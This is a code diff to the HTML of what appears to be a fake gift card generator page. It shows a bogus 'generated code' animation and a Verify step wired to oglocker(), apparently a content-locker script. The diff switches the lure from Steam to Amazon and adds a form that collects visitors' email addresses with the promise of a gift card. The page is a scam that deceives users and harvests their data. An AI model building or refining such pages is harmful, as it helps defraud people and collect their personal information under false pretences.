@@ -55,9 +55,9 @@
   </div>
 
   <!-- generating code div -->
-  <div id="codegeneration" class="h-screen flex flex-col hidden pt-40 md:pt-32 items-center text-center bg-gray-800 opacity-80">
+  <div id="codegeneration" class="h-screen flex flex-col hidden pt-20 items-center text-center bg-gray-800 opacity-80">
     <div id="codegenelements" class=" flex flex-col justify-center items-center text-center animate__animated animate__infinite">
-      <p class="text-3xl md:text-3xl lg:text-3xl xl:text-4xl pb-10 md:pb-20 text-white md:w-full md:px-30" id="price"></p>
+      <p class="text-3xl md:text-3xl lg:text-3xl xl:text-4xl pb-10 text-white md:w-full md:px-30" id="price"></p>
       <img class="w-20 md:w-24 lg:w-32 xl:w-40 hover:scale-105 animate-spin slower" src="./img/webImg/gear-animation.png" alt="Loading Gear">
     </div>
 
@@ -70,7 +70,12 @@
       <p id="generatedcode" class="text-3xl md:text-3xl lg:text-3xl xl:text-4xl mb-6 text-white mt-10 bg-gray-500 px-10 py-1 rounded-full"></p>
     </div>
 
-    <button id="verifybutton" data-custom-value="steamverify" onclick="oglocker()" class="bg-white text-black py-2 px-10 border rounded-lg pt-1">Verify</button>
+    <form id="verifybutton" action="javascript:void(0);" onsubmit="oglocker()" class="bg-black rounded-lg w-full px-10 py-5 md:w-96">
+      <p class="text-center text-white text-2xl">Enter your email to receive your gift card</p>
+      <input required type="email" name="email" id="email" placeholder="Your E-mail" class="py-2 rounded-lg w-full mb-2 px-1 mt-2"><br>
+      <button data-custom-value="amazonverify" class="bg-blue-700 text-black border rounded-lg py-2 w-full text-white">Verify</button>
+    </form>
+
   </div>
 
 
